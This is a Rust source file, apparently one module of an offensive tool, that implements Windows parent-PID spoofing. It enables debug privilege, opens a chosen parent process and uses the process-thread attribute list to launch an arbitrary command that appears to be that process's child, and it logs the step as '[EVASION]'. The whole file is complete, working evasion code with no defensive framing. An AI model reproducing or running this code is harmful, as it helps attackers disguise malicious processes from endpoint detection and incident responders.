//! PPID Spoofing - create process with spoofed parent PID

use crate::error::MemoricError;
use serde_json::Value;

/// Create a process with a spoofed parent PID
pub fn ppid_spoof(args: &Value) -> Result<Value, MemoricError> {
    use crate::safe_handle::SafeHandle;
    use windows::Win32::System::Threading::{
        CreateProcessW, DeleteProcThreadAttributeList, InitializeProcThreadAttributeList,
        OpenProcess, UpdateProcThreadAttribute, EXTENDED_STARTUPINFO_PRESENT,
        LPPROC_THREAD_ATTRIBUTE_LIST, PROCESS_CREATE_PROCESS, PROCESS_INFORMATION, STARTUPINFOEXW,
    };

    let parent_pid = args
        .get("parent_pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing parent_pid".to_string()))?;
    let command = args
        .get("command")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing command".to_string()))?;

    tracing::warn!(
        "[EVASION] PPID spoofing: parent={}, cmd={}",
        parent_pid,
        command
    );

    let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

    unsafe {
        let parent_handle =
            OpenProcess(PROCESS_CREATE_PROCESS, false, parent_pid as u32).map_err(|e| {
                MemoricError::WindowsApi(format!(
                    "Failed to open parent process {}: {}",
                    parent_pid, e
                ))
            })?;
        let parent_handle = SafeHandle::new(parent_handle);

        // Get attribute list size
        let mut size: usize = 0;
        let _ = InitializeProcThreadAttributeList(
            LPPROC_THREAD_ATTRIBUTE_LIST(std::ptr::null_mut()),
            1,
            0,
            &mut size,
        );

        let mut attr_buf = vec![0u8; size];
        let attr_list = LPPROC_THREAD_ATTRIBUTE_LIST(attr_buf.as_mut_ptr() as *mut _);

        InitializeProcThreadAttributeList(attr_list, 1, 0, &mut size).map_err(|e| {
            MemoricError::WindowsApi(format!("InitializeProcThreadAttributeList failed: {}", e))
        })?;

        // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
        let mut parent_raw = (*parent_handle).0 as isize;
        UpdateProcThreadAttribute(
            attr_list,
            0,
            0x00020000, // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
            Some(&mut parent_raw as *mut _ as *mut _),
            std::mem::size_of::<isize>(),
            None,
            None,
        )
        .map_err(|e| {
            MemoricError::WindowsApi(format!("UpdateProcThreadAttribute failed: {}", e))
        })?;

        let mut si_ex = STARTUPINFOEXW::default();
        si_ex.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
        si_ex.lpAttributeList = attr_list;

        let mut pi = PROCESS_INFORMATION::default();
        let mut cmd_w: Vec<u16> = command.encode_utf16().chain(std::iter::once(0)).collect();

        CreateProcessW(
            None,
            windows::core::PWSTR(cmd_w.as_mut_ptr()),
            None,
            None,
            false,
            EXTENDED_STARTUPINFO_PRESENT,
            None,
            None,
            &si_ex.StartupInfo,
            &mut pi,
        )
        .map_err(|e| {
            DeleteProcThreadAttributeList(attr_list);
            MemoricError::WindowsApi(format!("CreateProcessW failed: {}", e))
        })?;

        DeleteProcThreadAttributeList(attr_list);

        let _ph = SafeHandle::new(pi.hProcess);
        let _th = SafeHandle::new(pi.hThread);

        Ok(serde_json::json!({
            "success": true,
            "technique": "ppid_spoof",
            "spoofed_parent_pid": parent_pid,
            "child_pid": pi.dwProcessId,
            "child_tid": pi.dwThreadId,
            "command": command,
            "message": "Process created with spoofed parent PID"
        }))
    }
}
